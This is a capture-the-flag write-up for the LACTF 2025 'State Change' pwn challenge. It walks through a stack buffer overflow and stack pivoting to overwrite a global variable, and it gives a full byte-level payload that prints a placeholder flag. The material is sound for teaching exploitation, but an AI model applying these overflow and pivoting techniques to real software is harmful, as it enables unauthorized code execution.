# How to Use Stack Pivoting to Override Global Variables?

The challenge **"State Change"** from **LACTF 2025** will be used to explore this question. The challenge is available [here](https://github.com/uclaacm/lactf-archive/tree/main/2025/pwn/state-change).

## 1. Static Analysis

The challenge has a buffer overflow vulnerability that is easy to exploit due to the absence of stack canaries:

```bash
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols  FORTIFY  Fortified  Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols  No  0  1  chall
```

Since **PIE is disabled**, global variables have fixed addresses, making them easy to overwrite. However, the principle of **stack pivoting** remains useful even if these mitigations were enabled.

### Code Overview

The program contains global variables, including `state`:

```c
char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];
```

The `win` function requires `state` to be a specific value:

```c
void win() {
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    FILE* flagfile = fopen("flag.txt", "r");
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        puts("Here's the flag: ");
        puts(buf);
    }
}
```

However, `state` is initialized in `main` and is never modified later:

```c
int main() {
    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file...");
    vuln();
    return 0;
}
```

The `vuln` function has a buffer overflow:

```c
void vuln() {
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin); // 16-byte overflow
}
```

Since we can overwrite the **base pointer and return address**, we might think about directly jumping to `win()`, but `state` would remain incorrect.

## 2. What is Stack Pivoting?

Stack pivoting is a technique used when a buffer overflow does not provide enough space to inject a full ROP chain. Instead, we move the stack to a controlled section (like global variables or the heap) where we already have written a ROP chain.

Here, we use stack pivoting to overwrite the **global `state` variable** before calling `win()`. Here is the strategy:
1. Move the stack into the **data section**.
2. Call `vuln()` again.
3. Overwrite `state` with `0xf1eeee2d`.
4. Call `win()`.

## 3. Exploitation

### 3.1 Moving the Stack

At the end of `vuln()`, the `leave` instruction executes:
```
leave  →  mov rsp, rbp  →  pop rbp
```
As an example:
```
Before leave:                        After leave:
| Content    | Description       |   | Content    | Description       |   
| ---------- | ----------------- |   | ---------- | ----------------- |
| AAAAAAAA   | local_buf[0..7]   |   | AAAAAAAA   | local_buf[0..7]   |    
| AAAAAAAA   | local_buf[8..15]  |   | AAAAAAAA   | local_buf[8..15]  |
| AAAAAAAA   | local_buf[16..23] |   | AAAAAAAA   | local_buf[16..23] |
| AAAAAAAA   | local_buf[24..32] |   | AAAAAAAA   | local_buf[24..32] |
| BBBBBBBB   | <- $rbp           |   | BBBBBBBB   |                   |
| CCCCCCCC   |                   |   | CCCCCCCC   | <- $rsp           |
```
After `leave`, `$rbp` points to `BBBBBBBB` and `$rsp` points to the address containing `CCCCCCCC`. When `ret` executes, execution jumps to `CCCCCCCC`.

### 3.2 Calling `vuln()` Again

We cannot call `vuln()` from the beginning because it would reset `$rbp`:
```
00000000004012b5 <vuln>:
  4012b5:	f3 0f 1e fa          	endbr64
  4012b9:	55                   	push   %rbp
  4012ba:	48 89 e5             	mov    %rsp,%rbp
  4012bd:	48 83 ec 20          	sub    $0x20,%rsp
```

Instead, we will start at the very next instruction:
```
  4012c1:	48 8d 05 80 0d 00 00 	lea    0xd80(%rip),%rax
```

Thus, we overwrite the return address with `0x4012c1`.

### 3.3 Overwriting `state`
#### Determine `$rbp`
To overwrite the `state` variable, we should know where the buffer overflow will overwrite data. It depends on the `$rbp` pointer. Indeed, here are the instructions corresponding to the buffer overflow:
```
  4012d7:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  4012db:	be 30 00 00 00       	mov    $0x30,%esi
  4012e0:	48 89 c7             	mov    %rax,%rdi
  4012e3:	e8 d8 fd ff ff       	call   4010c0 <fgets@plt>
```
We can see that we will start to write 32 bytes before `$rbp` (-0x20), and write 48 bytes. So where to put `$rbp` in a first place? We should keep in mind that the data just after the `$rbp` pointer will correspond to the instruction address to run when `vuln` will return. The data pointed by `$rbp` will be erased at the beginning of the `win` function when the instruction `push %rbp` will be run. All the slots before are safe. So we can put `$rbp` anywhere after the `state` address. `state` address is `0x404540`, so we can set `BBBBBBBB` to `0x404548`. We then have the beginning of our payload:
```
echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x45\x40\x00\x00\x00\x00\x00\xc1\x12\x40\x00\x00\x00\x00..." | ./chall
```
With this payload, the `vuln` function will be run again (`\xc1\x12\x40\x00\x00\x00\x00` corresponds to the address of `vuln`), and the base pointer will point to the address just after `state` (`\x48\x45\x40\x00\x00\x00\x00\x00`).

#### Overwrite the `state` variable
The buffer overflow will happen a second time. Here is where we can write:
```
| Content    | Description | Address  |
| ---------- | ----------- | -------- |
| ........   |             | 0x404528 |
| ........   |             | 0x404530 |
| ........   |             | 0x404538 |
| 0xdeaddead | state       | 0x404540 |
| ........   | <- $rbp     | 0x404548 |
| ........   |             | 0x404550 |
```
All we have to do is to write the expected state from the 24th character: `0xf1eeee2d`. We can complete our payload:
```
echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x45\x40\x00\x00\x00\x00\x00\xc1\x12\x40\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x2d\xee\xee\xf1\x00\x00\x00\x00..." | ./chall
```
### Call the `win` function
Now that the `state` is correct, we just have to overwrite the data after `$rbp` to determine where to jump next. We do not care about the value pointed to by `$rbp`, so we can put everything here. Then, we write the address to the `win` function: `0x4011d6`. The final payload is:
```
$ echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x45\x40\x00\x00\x00\x00\x00\xc1\x12\x40\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x2d\xee\xee\xf1\x00\x00\x00\x00BBBBBBBB\xd6\x11\x40\x00\x00\x00\x00\x00" | ./chall
Hey there, I'm deaddead. Who are you?
Hey there, I'm deaddead. Who are you?
Here's the flag: 
lactf{fake_flag}
```
We can see that the `vuln` function is called twice, and then, the flag appears!